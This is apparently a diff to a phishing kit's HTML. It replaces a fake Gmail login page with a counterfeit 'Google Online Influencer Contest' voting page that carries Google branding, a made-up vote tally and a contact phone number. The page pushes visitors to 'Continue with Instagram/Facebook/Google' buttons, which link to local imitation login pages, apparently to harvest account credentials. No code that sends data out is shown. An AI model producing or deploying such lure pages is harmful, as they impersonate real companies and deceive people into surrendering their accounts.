@@ -1,25 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<link rel="stylesheet" href="../google/g.css">
-<title>Gmail Login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Google Online Influencer Contest</title>
+  <link rel="stylesheet" href="../interface/interface .css">
 </head>
 <body>
+  <div class="container">
+    <header>
+      <div class="logo">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        <h2>Online Influencer Contest</h2>
+      </div>
+      <div class="vote-now">VOTE NOW</div>
+    </header>
 
-<div class="login-container">
-  <div class="logo">
-    <!-- Google "G" Logo SVG -->
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Google Logo" />
+    <main>
+      <h3>Cast Your Vote</h3>
+      <p>Choose your voting method:</p>
+
+      <div class="buttons">
+        <a href="../instagram/Ig.html" style="text-decoration:none;">
+            <button class="instagram-button">
+                <img src="../interface/IMG/Instagram.png" alt="Instagram Logo"> Continue with Instagram
+            </button>
+          </a>
+          <a href="../facebook/fb.html" style="text-decoration:none;">
+        <button class="facebook-button">
+            <img src="../interface/IMG/facebook.png" alt="Facebook Logo"> Continue with Facebook
+        </button>
+        </a>
+       </a>
+      </div>
+      <div class="google-button-wrapper">
+        <a href="../google/g.html" style="text-decoration:none;">
+        <button class="google-button">
+          <img src="../interface/IMG/Google.png" alt="Google" />
+          <span>Continue with Google</span>
+        </button>
+      </div>
+      
+      <div class="progress-section">
+        <p><span class="votes">312</span> out of <span class="total">450</span> votes received</p>
+        <div class="progress-bar">
+          <div class="progress" style="width: 69.33%;"></div>
+        </div>
+      </div>
+
+      <section class="help">
+        <h4>Need Help?</h4>
+        <p>If you have any questions or issues with voting, please contact our support team:</p>
+        <p>    </p>
+        <p class="phone">+1 (936)-727-6517</p>
+      </section>
+    </main>
+
+    <footer>
+      <p>© 2023 Google Online Influencer Contest. All rights reserved.</p>
+    </footer>
   </div>
-  <h1>welcome</h1>
-  <form>
-    <label for="email">Password</label>
-    <input type="email" id="email" name="email" required placeholder="Password" />
-    <button type="submit" class="btn-next">Next</button>
-  </form>
-</div>
-
 </body>
 </html>
